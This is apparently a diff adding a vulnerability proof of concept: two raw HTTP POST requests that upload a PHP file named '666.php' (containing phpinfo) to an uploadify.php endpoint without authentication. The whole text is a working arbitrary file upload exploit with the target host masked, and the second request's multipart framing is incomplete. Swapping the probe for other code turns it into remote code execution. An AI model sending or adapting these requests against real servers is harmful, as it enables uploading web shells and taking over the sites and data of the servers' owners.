@@ -1,0 +1,38 @@
+POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
+Host: xxx.xxx.xxx.xxx:port
+User-Agent: test
+Connection: close
+Content-Length: 493
+Accept-Encoding: gzip
+Content-Type: multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
+
+--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
+Content-Disposition: form-data; name="Filedata"; filename="666.php"
+Content-Type: application/octet-stream
+
+<?php phpinfo();?>
+
+--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
+--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
+Content-Disposition: form-data; name="file"; filename=""
+Content-Type: application/octet-stream
+
+--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
+
+
+
+POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
+Host: xxx.xxx.xxx.xxx:port
+User-Agent: test
+Connection: close
+Content-Length: 493
+Accept-Encoding: gzip
+Content-Type: multipart/form-data
+
+------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+Content-Disposition: form-data; name="Filedata"; filename="666.php"
+Content-Type: application/octet-stream
+
+<?php phpinfo();?>
+
+------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
